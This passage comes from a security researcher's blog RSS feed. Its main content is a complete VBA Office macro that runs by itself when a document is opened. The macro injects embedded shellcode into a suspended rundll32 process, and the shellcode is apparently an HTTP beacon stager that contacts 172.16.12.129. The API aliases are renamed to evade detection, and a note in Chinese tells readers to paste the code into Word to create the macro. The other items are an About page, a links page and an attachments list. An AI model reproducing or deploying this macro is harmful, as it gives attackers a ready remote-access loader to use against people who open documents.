String&#xD;&#xA;    lpDesktop As String&#xD;&#xA;    lpTitle As String&#xD;&#xA;    dwX As Long&#xD;&#xA;    dwY As Long&#xD;&#xA;    dwXSize As Long&#xD;&#xA;    dwYSize As Long&#xD;&#xA;    dwXCountChars As Long&#xD;&#xA;    dwYCountChars As Long&#xD;&#xA;    dwFillAttribute As Long&#xD;&#xA;    dwFlags As Long&#xD;&#xA;    wShowWindow As Integer&#xD;&#xA;    cbReserved2 As Integer&#xD;&#xA;    lpReserved2 As Long&#xD;&#xA;    hStdInput As Long&#xD;&#xA;    hStdOutput As Long&#xD;&#xA;    hStdError As Long&#xD;&#xA;End Type&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Private Declare PtrSafe Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#Else&#xD;&#xA;    Private Declare Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long&#xD;&#xA;    Private Declare Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long&#xD;&#xA;    Private Declare Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long&#xD;&#xA;    Private Declare Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#End If&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;    Dim myByte As Long, myArray As Variant, offset As Long&#xD;&#xA;    Dim pInfo As PROCESS_INFORMATION&#xD;&#xA;    Dim sInfo As STARTUPINFO&#xD;&#xA;    Dim sNull As String&#xD;&#xA;    Dim sProc As String&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Dim rwxpage As LongPtr, res As LongPtr&#xD;&#xA;#Else&#xD;&#xA;    Dim rwxpage As Long, res As Long&#xD;&#xA;#End If&#xD;&#xA;    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _&#xD;&#xA;60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _&#xD;&#xA;80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _&#xD;&#xA;125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _&#xD;&#xA;91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _&#xD;&#xA;-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _&#xD;&#xA;83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _&#xD;&#xA;47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _&#xD;&#xA;104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _&#xD;&#xA;-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _&#xD;&#xA;-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _&#xD;&#xA;11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _&#xD;&#xA;-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _&#xD;&#xA;0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _&#xD;&#xA;49,55,50,46,49,54,46,49,50,46,49,50,57,0)&#xD;&#xA;    If Len(Environ(&amp;#34;ProgramW6432&amp;#34;)) &amp;gt; 0 Then&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\SysWOW64\\rundll32.exe&amp;#34;&#xD;&#xA;    Else&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\System32\\rundll32.exe&amp;#34;&#xD;&#xA;    End If&#xD;&#xA;    res = RunStuff(sNull, sProc, ByVal 0&amp;amp;, ByVal 0&amp;amp;, ByVal 1&amp;amp;, ByVal 4&amp;amp;, ByVal 0&amp;amp;, sNull, sInfo, pInfo)&#xD;&#xA;    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;    For offset = LBound(myArray) To UBound(myArray)&#xD;&#xA;        myByte = myArray(offset)&#xD;&#xA;        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;amp;)&#xD;&#xA;    Next offset&#xD;&#xA;    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将这串代码复制到WORD或者其他office中进行创建宏&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/links/</guid>
      <description>&lt;h1 id=&#34;友链&#34;&gt;友链&lt;/h1&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://skay.rce.la/&#34;&gt;Skay&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.ol4three.com/&#34;&gt;ol4three&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://l-i-n-g-c-e-n-g.github.io&#34;&gt;L1Nk8ug&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;友链旺铺招租有需要联系我&#34;&gt;友链旺铺招租，有需要联系我&lt;/h1&gt;</description>
    </item>
    <item>
      <title>About Me</title>
      <link>http://localhost:1313/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/about/</guid>
      <description>&lt;h1 id=&#34;y4ph3ts&#34;&gt;Y4ph3tS&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;安全研究员（FSRT学习中）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h1 id=&#34;部分专业认证&#34;&gt;部分专业认证&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;🔒 Security+  /  ISO27001  /  CISP  /  商用密码测评&lt;/li&gt;&#xA;&lt;li&gt;🔫 IDPA SO&lt;/li&gt;&#xA;&lt;li&gt;📻️ HAM（BI1UCN）&lt;/li&gt;&#xA;&lt;li&gt;🩹️ TECC  /  WAFA  /  TCMT  /  AHA&lt;/li&gt;&#xA;&lt;li&gt;🤿️ AOW  /  OW&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h1 id=&#34;计划中认证&#34;&gt;计划中认证&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;🔐 CISSP    /    Offsec系列    /    CISA    /    CDPSE&lt;/li&gt;&#xA;&lt;li&gt;🆘 WFR    /    TCCC    /    EFR / SRT&lt;/li&gt;&#xA;&lt;li&gt;🛩️ SPL    /    AOPA    /    CAAC&lt;/li&gt;&#xA;&lt;li&gt;🏔️ 国家应急救援员 / 山地户外指导员&lt;/li&gt;&#xA;&lt;li&gt;🪂 USPA&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;稍微懂一点编程语言&#34;&gt;稍微懂一点编程语言&lt;/h2&gt;&#xA;&lt;p&gt;Python、Go、PHP、JAVA、C++、汇编、Ruby、nim&amp;hellip;&lt;/p&gt;&#xA;&lt;h2 id=&#34;主要研究方向&#34;&gt;主要研究方向&lt;/h2&gt;&#xA;&lt;p&gt;攻防、商用密码、红队武器开发&lt;/p&gt;&#xA;&lt;h2 id=&#34;技术栈&#34;&gt;技术栈&lt;/h2&gt;&#xA;&lt;p&gt;WEB、内网、代码审计（JAVA、PHP）、免杀、近源渗透、社会工程学、安卓、应急响应、溯源&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;会一点WEB、会一点内网、会一点安卓、会一点密码学、会一点IoT、会一点车联网、会一点逆向，偶尔打打CTF&amp;hellip;&lt;/p&gt;&#xA;&lt;h2 id=&#34;others&#34;&gt;Others&lt;/h2&gt;&#xA;&lt;p&gt;🪖战术、户外装备优惠渠道（通用装甲、爱默生、龙牙、耐特科尔、纳丽德、塔虎、莱泽曼、拾月战术），欢迎咨询&lt;/p&gt;&#xA;&lt;h2 id=&#34;联系方式&#34;&gt;联系方式&lt;/h2&gt;&#xA;&lt;p&gt;公众号后台，找找群友，找找朋友，就能联系到我了（狗头）&lt;/p&gt;&#xA;&lt;h2 id=&#34;微信公众号年更选手&#34;&gt;微信公众号(年更选手)&lt;/h2&gt;&#xA;&lt;p&gt;魔影安全实验室&lt;/p&gt;</description>
    </item>
    <item>
      <title>附件列表</title>
      <link>http://localhost:1313/atta/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/atta/</guid>
      <description>&lt;h3 id=&#34;本目录下列出了文章中可能包含的一些附件直接点击链接下载&#34;&gt;本目录下列出了文章中可能包含的一些附件，直接点击链接下载。&lt;/h3&gt;&#xA;&lt;ul&gt;&#xD;&#xA;    &#xD;&#xA;    &#xD;&#xA;        &#xD;&#xA;    &#xD;&#xA;         &#xD;&#xA;            &lt;li&gt;&#xD;&#xA;                &lt;a href=&#34;http://localhost:1313/atta/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f.xmind&#34; download&gt;内网渗透.xmind&lt;/a&gt; &#xD;&#xA;            &lt;/li&gt;&#xD;&#xA;        &#xD;&#xA;    &#xD;&#xA;    &lt;/ul&gt;</description>
    </item>
  </channel>
</rss>
